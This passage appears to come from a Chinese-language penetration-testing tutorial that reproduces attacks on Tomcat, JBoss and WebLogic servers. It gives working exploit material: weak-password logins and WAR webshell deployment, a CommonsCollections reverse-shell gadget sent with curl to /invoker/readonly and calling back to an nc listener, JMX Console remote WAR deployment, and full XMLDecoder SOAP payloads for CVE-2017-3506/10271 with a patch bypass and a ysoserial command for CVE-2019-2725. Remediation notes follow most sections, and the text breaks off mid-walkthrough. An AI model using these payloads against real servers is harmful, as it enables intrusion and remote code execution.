<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;tomcat-users&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-gui&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-script&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-jmx&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;manager-status&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;admin-gui&quot;/&gt;</span><br><span class="line">&lt;role rolename=&quot;admin-script&quot;/&gt;</span><br><span class="line">&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; /&gt;</span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure>

<p>正常安装的情况下，tomcat7.0.94中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p>
<p>访问 <a href="http://127.0.0.1:8080/manager/html">http://127.0.0.1:8080/manager/html</a> ,输入弱密码tomcat:tomcat，登陆后台。</p>
<p>生成war包：<br>jar -cvf lxhspy.war lxhspy.jsp</p>
<p>部署后，访问 <a href="http://127.0.0.1:8080/war%E5%8C%85%E5%90%8D/%E5%8C%85%E5%90%8D%E5%86%85%E6%96%87%E4%BB%B6%E5%90%8D">http://127.0.0.1:8080/war包名/包名内文件名</a>, 如下。</p>
<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 若无必要，取消manager/html功能。</span><br><span class="line">2. 若要使用，manager页面应只允许本地IP访问</span><br></pre></td></tr></table></figure>

<h3 id="Tomcat-manager-App-暴力破解暴力破解"><a href="#Tomcat-manager-App-暴力破解暴力破解" class="headerlink" title="Tomcat manager App 暴力破解暴力破解"></a>Tomcat manager App 暴力破解暴力破解</h3><p>环境：Apache Tomcat&#x2F;7.0.94</p>
<p>访问：<a href="http://127.0.0.1:8080/manager/html">http://127.0.0.1:8080/manager/html</a>, 输入密码，抓包，如下。</p>
<p>刚才输入的账号密码在HTTP字段中的Authorization中，规则为Base64Encode(user:passwd)<br>Authorization: Basic dG9tY2F0OmFkbWlu<br>解码之后如下：</p>
<p>将数据包发送到intruder模块，并标记dG9tY2F0OmFkbWlu。</p>
<p>Payload type选择 Custom iterator，设置三个position， 1 为用户字典， 2 为:， 3 为密码字典，并增加Payload Processing 为Base64-encode如下：</p>
<p>最后取消Palyload Encoding编码。</p>
<p>结果：</p>
<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 若无必要，取消manager/html功能。</span><br><span class="line">2. 若要使用，manager页面应只允许本地IP访问</span><br></pre></td></tr></table></figure>

<h2 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h2><p>jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支<br>持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet&#x2F;JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<p>默认端口:8080,9990</p>
<p>Windows下Jboss安装，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 下载http://jbossas.jboss.org/downloads/</span><br><span class="line">2. 解压，我这里解压后的目录为：C:\jboss-6.1.0.Final</span><br><span class="line">3. 新建环境变量：JBOSS_HOME 值为： C:\jboss-6.1.0.Final</span><br><span class="line">在path中加入：;%JBOSS_HOME%\bin;</span><br><span class="line">4. 打开C:\jboss-6.1.0.Final\bin 双击run.bat。出现info消息，即配置成功。</span><br></pre></td></tr></table></figure>

<p><strong>Note:</strong> 注意注意 <strong>JDK</strong> 版本要在版本要在 <strong>1.6~1.7</strong> 之间，之间， <strong>1.8</strong> 版本版本 <strong>jBoss</strong> 运行打开运行打开 <strong>JMX Console</strong> 会出现会出现 <strong>500</strong> 错误。错误。</p>
<p>jboss默认部署路径：C:\jboss-6.1.0.Final\server\default\deploy\ROOT.war</p>
<p>设置外网访问，<br>将C:\jboss-6.1.0.Final\server\default\deploy\jbossweb.sar\server.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- A HTTP/1.1 Connector on port 8080 --&gt;</span><br><span class="line">&lt;Connector protocol=&quot;HTTP/1.1&quot; port=&quot;$&#123;jboss.web.http.port&#125;&quot; address=&quot;$&#123;jboss.bind.address&#125;&quot;</span><br><span class="line">redirectPort=&quot;$&#123;jboss.web.https.port&#125;&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>将address&#x3D;”${jboss.bind.address}” 设置为address&#x3D;”0.0.0.0” ,并重启JBoss</p>
<h3 id="JBoss-5-x-x2F-6-x-反序列化漏洞（反序列化漏洞（-CVE-2017-12149-））"><a href="#JBoss-5-x-x2F-6-x-反序列化漏洞（反序列化漏洞（-CVE-2017-12149-））" class="headerlink" title="JBoss 5.x&#x2F;6.x 反序列化漏洞（反序列化漏洞（ CVE-2017-12149 ））"></a>JBoss 5.x&#x2F;6.x 反序列化漏洞（反序列化漏洞（ CVE-2017-12149 ））</h3><p>访问 &#x2F;invoker&#x2F;readonly</p>
<p>返回 500 ，说明页面存在，此页面存在反序列化漏洞。</p>
<p>利用工具:JavaDeserH2HC,我们选择一个Gadget：ReverseShellCommonsCollectionsHashMap，编译并生成序列化数据：</p>
<p>生成ReverseShellCommonsCollectionsHashMap.class</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br></pre></td></tr></table></figure>

<p>生成ReverseShellCommonsCollectionsHashMap.ser</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.31.232:6666（ip是nc所在的ip）</span><br></pre></td></tr></table></figure>

<p>利用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://192.168.31.205:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>

<h3 id="JBoss-JMXInvokerServlet-反序列化漏洞反序列化漏洞"><a href="#JBoss-JMXInvokerServlet-反序列化漏洞反序列化漏洞" class="headerlink" title="JBoss JMXInvokerServlet 反序列化漏洞反序列化漏洞"></a>JBoss JMXInvokerServlet 反序列化漏洞反序列化漏洞</h3><p>访问 &#x2F;invoker&#x2F;JMXInvokerServlet</p>
<p>返回如下，说明接口开放，此接口存在反序列化漏洞。</p>
<p>这里直接利用CVE-2017-12149生成的ser，发送到&#x2F;invoker&#x2F;JMXInvokerServlet接口中。<br>如下：</p>
<h3 id="JBoss-EJBInvokerServlet-反序列化漏洞反序列化漏洞"><a href="#JBoss-EJBInvokerServlet-反序列化漏洞反序列化漏洞" class="headerlink" title="JBoss EJBInvokerServlet 反序列化漏洞反序列化漏洞"></a>JBoss EJBInvokerServlet 反序列化漏洞反序列化漏洞</h3><p>访问 &#x2F;invoker&#x2F;EJBInvokerServlet<br>返回如下，说明接口开放，此接口存在反序列化漏洞。</p>
<p>这里直接利用CVE-2017-12149生成的ser，发送到&#x2F;invoker&#x2F;EJBInvokerServlet接口中。<br>如下：</p>
<h4 id="修复建议修复建议"><a href="#修复建议修复建议" class="headerlink" title="修复建议修复建议"></a>修复建议修复建议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 不需要 http-invoker.sar 组件的用户可直接删除此组件。路径为：C:\jboss-6.1.0.Final\server\default\deploy\http-invoker.sar,删除后访问404.</span><br><span class="line">2. 或添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中，对 http invoker 组件进行访问控制：</span><br><span class="line">&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">路径为：C:\jboss-6.1.0.Final\server\default\deploy\http-invoker.sar\invoker.war\WEB-INF\web.xml</span><br></pre></td></tr></table></figure>

<h3 id="JBoss-lt-x3D-4-x-JBossMQ-JMS-反序列化漏洞（反序列化漏洞（-CVE-2017-7504-））"><a href="#JBoss-lt-x3D-4-x-JBossMQ-JMS-反序列化漏洞（反序列化漏洞（-CVE-2017-7504-））" class="headerlink" title="JBoss &lt;&#x3D;4.x JBossMQ JMS 反序列化漏洞（反序列化漏洞（ CVE-2017-7504 ））"></a>JBoss &lt;&#x3D;4.x JBossMQ JMS 反序列化漏洞（反序列化漏洞（ CVE-2017-7504 ））</h3><p>环境:jboss-4.2.3</p>
<p>设置外网访问:<br>在C:\jboss-4.2.3\server\default\deploy\jboss-web.deployer\server.xml<br>将address&#x3D;”${jboss.bind.address} 改为：address&#x3D;”0.0.0.0”, 重启Jboss</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Connector port=&quot;8080&quot; address=&quot;$&#123;jboss.bind.address&#125;&quot;</span><br><span class="line">maxThreads=&quot;250&quot; maxHttpHeaderSize=&quot;8192&quot;</span><br><span class="line">emptySessionPath=&quot;true&quot; protocol=&quot;HTTP/1.1&quot;</span><br><span class="line">enableLookups=&quot;false&quot; redirectPort=&quot;8443&quot; acceptCount=&quot;100&quot;</span><br><span class="line">connectionTimeout=&quot;20000&quot; disableUploadTimeout=&quot;true&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>访问&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet，<br>返回This is the JBossMQ HTTP-IL，说明页面存在，此页面存在反序列化漏洞。</p>
<p>这里直接利用CVE-2017-12149生成的ser，发送到&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet接口中。<br>如下：</p>
<p>修复建议修复建议</p>
<p>升级至最新版。</p>
<h3 id="Administration-Console-弱口令弱口令"><a href="#Administration-Console-弱口令弱口令" class="headerlink" title="Administration Console 弱口令弱口令"></a>Administration Console 弱口令弱口令</h3><p>Administration Console管理页面存在弱口令，admin:admin，登陆后台上传war包。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 点击Web Application (WAR)s</span><br><span class="line">2. Add a new resource，上传war包</span><br><span class="line">3. 点击创建的war包进入下一层，若状态为stop，点击Start按钮（默认都是start状态，不需要点击Start按钮）</span><br><span class="line">4. 访问。</span><br><span class="line">http://xx.xx.xx.xx/[warname]/shellname.jsp</span><br></pre></td></tr></table></figure>

<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 修改密码</span><br><span class="line">C:\jboss-6.1.0.Final\server\default\conf\props\jmx-console-users.properties</span><br><span class="line">2. 或删除Administration Console页面。</span><br><span class="line">JBoss版本&gt;=6.0，admin-console页面路径为： C:\jboss-6.1.0.Final\common\deploy\admin-console.war</span><br><span class="line">6.0之前的版本，路径为C:\jboss-4.2.3\server\default\deploy\management\console-mgr.sar\web-console.war</span><br></pre></td></tr></table></figure>

<h3 id="JMX-Console-未授权访问未授权访问"><a href="#JMX-Console-未授权访问未授权访问" class="headerlink" title="JMX Console 未授权访问未授权访问"></a>JMX Console 未授权访问未授权访问</h3><p>JMX Console默认存在未授权访问，直接点击JBoss主页中的JMX Console链接进入JMX Console页面。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 在JMX Console页面点击jboss.system链接，在Jboss.system页面中点击service=MainDeployer，如下</span><br><span class="line">2. 进入service=MainDeployer页面之后，找到methodIndex为17 or 19的deploy 填写远程war包地址进行远程部署。</span><br><span class="line">3. 这里我部署的war包为lxh.war，链接如下：</span><br><span class="line">http://192.168.31.205:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system:service=MainDeployer&amp;methodIndex=17&amp;arg0=http://192.168.31.205/lxh.war</span><br><span class="line">4. 访问</span><br><span class="line">http://xx.xx.xx.xx/[warname]/shellname.jsp</span><br></pre></td></tr></table></figure>

<p>修复建议修复建议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 增加密码措施，防止未授权访问。</span><br><span class="line">1 ）在C:\jboss-6.1.0.Final\common\deploy\jmx-console.war\WEB-INF\jboss-web.xml开启安全配置。</span><br><span class="line">2 ）在C:\jboss-6.1.0.Final\common\deploy\jmx-console.war\WEB-INF\web.xml开启安全认证。</span><br><span class="line">3 ）在C:\jboss-6.1.0.Final\server\default\conf\login-config.xml中可以看到JMX Console的用户密码配置位置。</span><br><span class="line">&lt;application-policy name=&quot;jmx-console&quot;&gt;</span><br><span class="line">&lt;authentication&gt;</span><br><span class="line">&lt;login-module code=&quot;org.jboss.security.auth.spi.UsersRolesLoginModule&quot;</span><br><span class="line">flag=&quot;required&quot;&gt;</span><br><span class="line">&lt;module-option name=&quot;usersProperties&quot;&gt;props/jmx-console-users.properties&lt;/module-option&gt;</span><br><span class="line">&lt;module-option name=&quot;rolesProperties&quot;&gt;props/jmx-console-roles.properties&lt;/module-option&gt;</span><br><span class="line">&lt;/login-module&gt;</span><br><span class="line">&lt;/authentication&gt;</span><br><span class="line">4 ）配置用户密码以及用户权限，这里新增lxhsec用户。</span><br><span class="line">5 ）重启JBoss，效果如下：</span><br></pre></td></tr></table></figure>

<p>2.或删除JMX Console,后重启JBoss</p>
<p>C:\jboss-6.1.0.Final\common\deploy\jmx-console.war</p>
<h2 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h2><p>WebLogic是美国Oracle公司出品的一个applicationserver，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布<br>式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之<br>中。</p>
<p>默认端口:7001</p>
<p>测试环境版本：10.3.6<br>下载地址：<a href="https://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_win32.exe">https://download.oracle.com/otn/nt/middleware/11g/wls/1036/wls1036_win32.exe</a>?<br>AuthParam&#x3D;1559386164_88cf328d83f60337f08c2c94ee292954</p>
<p>下载完成后双击运行，一直点下一步就ok了。</p>
<p>安装完成之后，在C:\Oracle\Middleware\user_projects\domains\base_domain这个目录双击startWebLogic.cmd启动Weblogic服务。</p>
<p>浏览器访问：<a href="http://127.0.0.1:7001/">http://127.0.0.1:7001/</a>, 界面上出现Error 404–Not Found，即启动成功。</p>
<p>设置外网访问，在 域结构 -&gt; 环境 -&gt; 服务器<br>右边选择相应的Server（管理服务器），打开进行编辑，在监听地址:中填入0.0.0.0，保存后，重启Weblogic服务器即可。</p>
<p>以下复现若无特别说明均采用Weblogic 10.3.6</p>
<h3 id="XMLDecoder-反序列化漏洞（反序列化漏洞（-CVE-2017-10271-amp-CVE-2017-3506-））"><a href="#XMLDecoder-反序列化漏洞（反序列化漏洞（-CVE-2017-10271-amp-CVE-2017-3506-））" class="headerlink" title="XMLDecoder 反序列化漏洞（反序列化漏洞（ CVE-2017-10271 &amp; CVE-2017-3506 ））"></a>XMLDecoder 反序列化漏洞（反序列化漏洞（ CVE-2017-10271 &amp; CVE-2017-3506 ））</h3><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可<br>执行任意命令。</p>
<p>访问 &#x2F;wls-wsat&#x2F;CoordinatorPortType</p>
<p>返回如下页面，则可能存在此漏洞。</p>
<p>漏洞不仅存在于 &#x2F;wls-wsat&#x2F;CoordinatorPortType 。<br>只要是在wls-wsat包中的Uri皆受到影响，可以查看web.xml得知所有受到影响的Uri，路径<br>为：C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\wls-wsat\54p17w\war\WEB-INF\web.xml</p>
<p>默认受到影响的Uri如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>

<p>构造 写入文件 数据包发送，如下，其中Content-Type需要等于text&#x2F;xml,否则可能导致XMLDecoder不解析。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 629</span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;</span><br><span class="line">&lt;object class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test33.jsp&lt;/string&gt;</span><br><span class="line">&lt;void method=&quot;println&quot;&gt;</span><br><span class="line">&lt;string&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">&lt;% out.print(&quot;test777776666666&quot;); %&gt;</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">&lt;/object&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>访问 &#x2F;bea_wls_internal&#x2F;test2.jsp,如下：</p>
<p>不熟悉JAVA的小伙伴们可能会对这个构造的XML有所疑惑，可以参考下这篇文章。</p>
<p>CVE-2017-3506的补丁加了验证函数，补丁在weblogic&#x2F;wsee&#x2F;workarea&#x2F;WorkContextXmlInputAdapter.java中添加了validate方法, 验证Payload中的节点是否<br>存在object Tag。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void validate(InputStream is)&#123;</span><br><span class="line">WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();</span><br><span class="line">try &#123;</span><br><span class="line">SAXParser parser =factory.newSAXParser();</span><br><span class="line">parser.parse(is, newDefaultHandler() &#123;</span><br><span class="line">public void startElement(String uri, StringlocalName, String qName, Attributes attributes)throws SAXException &#123;</span><br><span class="line">if(qName.equalsIgnoreCase(&quot;object&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Invalid context type: object&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125; catch(ParserConfigurationException var5) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Parser Exception&quot;, var5);</span><br><span class="line">&#125; catch (SAXExceptionvar6) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Parser Exception&quot;, var6);</span><br><span class="line">&#125; catch (IOExceptionvar7) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Parser Exception&quot;, var7);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们将object换成void就可绕过此补丁，产生了CVE-2017-10271。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class="line">&lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java&gt;</span><br><span class="line">&lt;void class=&quot;java.io.PrintWriter&quot;&gt;</span><br><span class="line">&lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test33.jsp&lt;/string&gt;</span><br><span class="line">&lt;void method=&quot;println&quot;&gt;</span><br><span class="line">&lt;string&gt;</span><br><span class="line">&lt;![CDATA[</span><br><span class="line">&lt;% out.print(&quot;test777776666666&quot;); %&gt;</span><br><span class="line">]]&gt;</span><br><span class="line">&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void method=&quot;close&quot;/&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p>修复建议修复建议</p>
<p>1 ）安装补丁。<br>2 ）或删除wls-wsat组件，再次访问返回404.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.删除C:\Oracle\Middleware\wlserver_10.3\server\lib\wls-wsat.war</span><br><span class="line">2.删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\.internal\wls-wsat.war</span><br><span class="line">3.删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat</span><br><span class="line">4.重启Weblogic</span><br></pre></td></tr></table></figure>

<p>Note：wls-wsat.war属于一级应用包，对其进行移除或更名操作可能造成未知的后果，Oracle官方不建议对其进行此类操作。</p>
<h3 id="Weblogic-wls9-async-response-wls-wsat-反序列化远程代码执行漏洞（反序列化远程代码执行漏洞（-CVE-2019"><a href="#Weblogic-wls9-async-response-wls-wsat-反序列化远程代码执行漏洞（反序列化远程代码执行漏洞（-CVE-2019" class="headerlink" title="Weblogic wls9_async_response,wls-wsat 反序列化远程代码执行漏洞（反序列化远程代码执行漏洞（ CVE-2019-"></a>Weblogic wls9_async_response,wls-wsat 反序列化远程代码执行漏洞（反序列化远程代码执行漏洞（ CVE-2019-</h3><h3 id="2725-））"><a href="#2725-））" class="headerlink" title="2725 ））"></a>2725 ））</h3><p>影响组件：bea_wls9_async_response.war, wls-wsat.war<br>影响版本：10.3.6.0, 12.1.3.0</p>
<h5 id="bea-wls9-async-response-war"><a href="#bea-wls9-async-response-war" class="headerlink" title="bea_wls9_async_response.war"></a>bea_wls9_async_response.war</h5><p>访问 &#x2F;_async&#x2F;AsyncResponseService<br>返回如下页面，则可能存在此漏洞。</p>
<p>漏洞不仅存在于 &#x2F;_async&#x2F;AsyncResponseService<br>只要是在bea_wls9_async_response包中的Uri皆受到影响，可以查看web.xml得知所有受到影响的Uri，路径为：<br>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls9_async_response\8tpkys\war\WEB-INF\web.xml</p>
<p>默认受到影响的Uri如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/_async/AsyncResponseService</span><br><span class="line">/_async/AsyncResponseServiceJms</span><br><span class="line">/_async/AsyncResponseServiceHttps</span><br></pre></td></tr></table></figure>

<p>wls-wsat.war受影响的URI见XMLDecoder 反序列化漏洞（CVE-2017-10271 &amp; CVE-2017-3506）</p>
<p>此漏洞实际上是CVE-2017-10271的又一入口，那么它是怎么绕过CVE-2017-10271的补丁，执行REC的呢。</p>
<p>先来看一下CVE-2017-10271的补丁代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void startElement(String uri, String localName, String qName, Attributesattributes)throws SAXException &#123;</span><br><span class="line">if(qName.equalsIgnoreCase(&quot;object&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Invalid element qName:object&quot;);</span><br><span class="line">&#125; else if(qName.equalsIgnoreCase(&quot;new&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Invalid element qName:new&quot;);</span><br><span class="line">&#125; else if(qName.equalsIgnoreCase(&quot;method&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Invalid element qName:method&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">if(qName.equalsIgnoreCase(&quot;void&quot;)) &#123;</span><br><span class="line">for(int attClass = 0; attClass &lt; attributes.getLength();++attClass) &#123;</span><br><span class="line">if(!&quot;index&quot;.equalsIgnoreCase(attributes.getQName(attClass)))&#123;</span><br><span class="line">throw new IllegalStateException(&quot;Invalid attribute for elementvoid:&quot; + attributes.getQName(attClass));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(qName.equalsIgnoreCase(&quot;array&quot;)) &#123;</span><br><span class="line">String var9 =attributes.getValue(&quot;class&quot;);</span><br><span class="line">if(var9 != null &amp;&amp;!var9.equalsIgnoreCase(&quot;byte&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;The value of class attribute is notvalid for array element.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中CVE-2017-3506的补丁是过滤了object，CVE-2017-10271的补丁是过滤了new，method标签，且void后面只能跟index，array后面可以跟class，但是<br>必须要是byte类型的。<br>绕过CVE-2017-10271补丁是因为class标签未被过滤所导致的，这点我们可以从Oracle 发布的CVE-2019-2725补丁看出来，<br>CVE-2019-2725补丁新增部分内容，将class加入了黑名单，限制了array标签中的byte长度。如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if (qName.equalsIgnoreCase(&quot;class&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Invalid element qName:class&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">if (qName.equalsIgnoreCase(&quot;array&quot;)) &#123;</span><br><span class="line">String attClass = attributes.getValue(&quot;class&quot;);</span><br><span class="line">if (attClass != null &amp;&amp; !attClass.equalsIgnoreCase(&quot;byte&quot;)) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;The value of class attribute is not valid for array element.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">String lengthString = attributes.getValue(&quot;length&quot;);</span><br><span class="line">if (lengthString != null) &#123;</span><br><span class="line">try &#123;</span><br><span class="line">int length = Integer.valueOf(lengthString);</span><br><span class="line">if (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Exceed array length limitation&quot;);</span><br><span class="line">&#125;</span><br><span class="line">this.overallarraylength += length;</span><br><span class="line">if (this.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123;</span><br><span class="line">throw new IllegalStateException(&quot;Exceed over all array limitation.&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125; catch (NumberFormatException var8) &#123;</span><br></pre></td></tr></table></figure>

<p>复现：</p>
<h6 id="Weblogic-10-3-6-利用利用-oracle-toplink-internal-sessions-UnitOfWorkChangeSet-构造函数执行构造函数执行-readObject"><a href="#Weblogic-10-3-6-利用利用-oracle-toplink-internal-sessions-UnitOfWorkChangeSet-构造函数执行构造函数执行-readObject" class="headerlink" title="Weblogic 10.3.6 利用利用 oracle.toplink.internal.sessions.UnitOfWorkChangeSet 构造函数执行构造函数执行 readObject()."></a>Weblogic 10.3.6 利用利用 oracle.toplink.internal.sessions.UnitOfWorkChangeSet 构造函数执行构造函数执行 readObject().</h6><p>构造函数参考</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public UnitOfWorkChangeSet(byte[] bytes) throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">java.io.ByteArrayInputStream byteIn = new java.io.ByteArrayInputStream(bytes);</span><br><span class="line">ObjectInputStream objectIn = new ObjectInputStream(byteIn);</span><br><span class="line">//bug 4416412: allChangeSets set directly instead of using setInternalAllChangeSets</span><br><span class="line">allChangeSets = (IdentityHashtable)objectIn.readObject();</span><br><span class="line">deletedObjects = (IdentityHashtable)objectIn.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>UnitOfWorkChangeSet的参数是一个Byte数组，因此我们需要将Payload转换为Byte[].</p>
<p>利用ysoserial生成Payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar Jdk7u21 &quot;cmd /c echo lxhsec &gt; servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/echoxxxxx.txt&quot; &gt; payload.txt</span><br></pre></td></tr></table></figure>

<p>然后使用下列代码，将Payload进行转换成Byte[]</p>
